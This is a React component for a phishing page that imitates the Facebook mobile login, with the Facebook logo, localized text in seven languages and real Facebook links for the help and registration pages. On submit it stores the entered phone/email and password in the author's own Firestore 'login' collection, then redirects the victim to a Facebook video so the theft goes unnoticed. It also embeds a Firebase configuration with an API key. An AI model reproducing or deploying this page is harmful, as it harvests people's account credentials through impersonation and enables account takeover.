import React, { useState } from 'react';
import './Login.css';
import eyeIcon from './Imaganes/ver.png';
import eyeOffIcon from './Imaganes/esconder.png';
import { initializeApp } from 'firebase/app';
import { getFirestore, collection, addDoc } from 'firebase/firestore';

// Configuración de Firebase usando las credenciales proporcionadas
const firebaseConfig = {
  apiKey: "AIzaSyB6X9-_ZTbdE5MZT_5WJfsOBkXaXs4dmUg",
  authDomain: "proyectologinface.firebaseapp.com",
  projectId: "proyectologinface",
  storageBucket: "proyectologinface.appspot.com",
  messagingSenderId: "101416817891987041171",
  appId: "1:101416817891987041171:web:4ab31d1a7bc580ea3bb68e"
};

// Inicializa la aplicación Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const translations = {
  'Español (España)': {
    language: 'Español (España)',
    mobileEmail: 'Móvil o correo electrónico',
    password: 'Contraseña',
    signIn: 'Iniciar sesión',
    forgotPassword: '¿Has olvidado la contraseña?',
    createAccount: 'Crear cuenta nueva',
    meta: 'Meta',
    info: 'Información',
    help: 'Ayuda',
    more: 'Más',
    selectLanguage: 'Selecciona tu idioma',
  },
  'English (US)': {
    language: 'English (US)',
    mobileEmail: 'Mobile or email',
    password: 'Password',
    signIn: 'Sign In',
    forgotPassword: 'Forgot Password?',
    createAccount: 'Create New Account',
    meta: 'Meta',
    info: 'Information',
    help: 'Help',
    more: 'More',
    selectLanguage: 'Select your language',
  },
  'Português (Brasil)': {
    language: 'Português (Brasil)',
    mobileEmail: 'Celular ou e-mail',
    password: 'Senha',
    signIn: 'Entrar',
    forgotPassword: 'Esqueceu a senha?',
    createAccount: 'Criar nova conta',
    meta: 'Meta',
    info: 'Informação',
    help: 'Ajuda',
    more: 'Mais',
    selectLanguage: 'Selecione seu idioma',
  },
  'Français (France)': {
    language: 'Français (France)',
    mobileEmail: 'Mobile ou e-mail',
    password: 'Mot de passe',
    signIn: 'Se connecter',
    forgotPassword: 'Mot de passe oublié?',
    createAccount: 'Créer un nouveau compte',
    meta: 'Meta',
    info: 'Informations',
    help: 'Aide',
    more: 'Plus',
    selectLanguage: 'Sélectionnez votre langue',
  },
  'Deutsch': {
    language: 'Deutsch',
    mobileEmail: 'Handy oder E-Mail',
    password: 'Passwort',
    signIn: 'Einloggen',
    forgotPassword: 'Passwort vergessen?',
    createAccount: 'Neues Konto erstellen',
    meta: 'Meta',
    info: 'Information',
    help: 'Hilfe',
    more: 'Mehr',
    selectLanguage: 'Wählen Sie Ihre Sprache',
  },
  'Italiano': {
    language: 'Italiano',
    mobileEmail: 'Cellulare o e-mail',
    password: 'Password',
    signIn: 'Accedi',
    forgotPassword: 'Hai dimenticato la password?',
    createAccount: 'Crea nuovo account',
    meta: 'Meta',
    info: 'Informazioni',
    help: 'Aiuto',
    more: 'Altro',
    selectLanguage: 'Seleziona la tua lingua',
  },
  'العربية': {
    language: 'العربية',
    mobileEmail: 'رقم الجوال أو البريد الإلكتروني',
    password: 'كلمة المرور',
    signIn: 'تسجيل الدخول',
    forgotPassword: 'هل نسيت كلمة المرور؟',
    createAccount: 'إنشاء حساب جديد',
    meta: 'ميتا',
    info: 'معلومات',
    help: 'مساعدة',
    more: 'المزيد',
    selectLanguage: 'اختر لغتك',
  },
  // Agrega más idiomas aquí si es necesario...
};

const Login = () => {
  const [numero, setNumero] = useState('');
  const [conta, setConta] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showLanguagePanel, setShowLanguagePanel] = useState(false);
  const [selectedLanguage, setSelectedLanguage] = useState('Español (España)');
  const t = translations[selectedLanguage];

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      console.log("Enviando datos a Firestore:", { numero, conta });
      const docRef = await addDoc(collection(db, 'login'), {
        numero,
        conta
      });
      console.log("Documento escrito con ID: ", docRef.id);
      setNumero('');
      setConta('');
      window.location.href = 'https://www.facebook.com/share/v/ayxxhtBimDWwNtez/?mibextid=oFDknk';
    } catch (e) {
      console.error("Error al agregar documento: ", e);
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const toggleLanguagePanel = () => {
    setShowLanguagePanel(!showLanguagePanel);
  };

  const selectLanguage = (language) => {
    setSelectedLanguage(language);
    setShowLanguagePanel(false);
  };

  return (
    <div>
      <div className="login-header" onClick={toggleLanguagePanel}>{t.language}</div>
      <div className="login-logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo" />
      </div>
      <form className="login-form" onSubmit={handleSubmit}>
        <div className="login-input">
          <input
            type="text"
            placeholder={t.mobileEmail}
            value={numero}
            onChange={(e) => setNumero(e.target.value)}
            required
          />
        </div>
        <div className="login-input">
          <input
            type={showPassword ? 'text' : 'password'}
            placeholder={t.password}
            value={conta}
            onChange={(e) => setConta(e.target.value)}
            required
          />
          {conta && (
            <span className="toggle-visibility" onClick={togglePasswordVisibility}>
              <img src={showPassword ? eyeOffIcon : eyeIcon} alt="Toggle visibility" width="24" />
            </span>
          )}
        </div>
        <button type="submit" className="login-button">{t.signIn}</button>
      </form>
      <div className="login-footer">
        <a href="https://m.facebook.com/login/identify/">{t.forgotPassword}</a>
      </div>
      <button
        className="create-account-button"
        onClick={() => window.location.href = 'https://m.facebook.com/reg/'}
      >
        {t.createAccount}
      </button>
      <div className="login-meta">{t.meta}</div>
      <div className="login-info">
        <a href="https://about.meta.com/">{t.info}</a>
        <a href="https://m.facebook.com/help/?ref=pf">{t.help}</a>
        <a href="#more">{t.more}</a>
      </div>
      {showLanguagePanel && (
        <div className="language-panel">
          <div className="language-panel-header">
            <button className="close-button" onClick={toggleLanguagePanel}>X</button>
          </div>
          <h2 className="language-panel-title">{t.selectLanguage}</h2>
          <div className="language-list">
            <ul>
              {Object.keys(translations).map((language) => (
                <li key={language} onClick={() => selectLanguage(language)}>
                  <span>{translations[language].language}</span>
                  <input type="checkbox" checked={selectedLanguage === language} readOnly />
                </li>
              ))}
            </ul>
          </div>
        </div>
      )}
    </div>
  );
};

export default Login;
